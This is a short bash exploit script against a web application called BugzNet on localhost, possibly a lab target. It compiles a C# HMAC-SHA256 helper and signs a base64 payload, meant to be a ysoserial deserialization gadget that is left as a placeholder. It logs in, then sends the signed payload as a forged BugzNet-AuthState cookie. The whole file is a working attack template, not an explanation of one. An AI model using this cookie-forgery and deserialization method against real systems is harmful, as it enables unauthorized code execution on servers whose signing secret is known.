#!/bin/bash


if [[ $# -lt 3 ]]
then
    echo "USAGE: $0 <username> <password> <hmac_secret>"
    exit 1
fi

rhost="http://localhost"
username=$1
password=$2
secret=$3
cookieJar=mktemp

crypto="
using System;
using System.Security.Cryptography;
using System.Text;
namespace crypto
{
        internal class Program
        {
                static void Main(string[] args)
                {
                    using (var hmacsha256 = new HMACSHA256(Encoding.UTF8.GetBytes(args[0])))
                    {
                        var hash = hmacsha256.ComputeHash(Encoding.UTF8.GetBytes(args[1]));
                        Console.WriteLine(Convert.ToBase64String(hash));
                    }
                }
        }
}"
echo $crypto > crypto.cs
mcs -out:crypto.exe crypto.cs

payload="{}" # <-- put ysoserial payload here

payload=$(echo -n $payload | base64 | tr -d '\n')
signature=$(mono crypto.exe "$secret" "$payload")

xsrf_token=$(curl -c $cookieJar -s "$rhost/Identity/Login" | htmlq 'input[name=xsrf_token]' -a value)

curl -b $cookieJar -c $cookieJar "$rhost/Identity/Login?handler=Login" \
        --data-urlencode "Data.Email=$username" \
        --data-urlencode "Data.Password=$password" \
        --data-urlencode "xsrf_token=$xsrf_token"

curl -i "$rhost/Bugs" \
   -b "BugzNet-AuthState=$payload.$signature" \
   -b "BugzNet-Session=$(cat $cookieJar | grep BugzNet-Session  | awk '{print $NF}')" 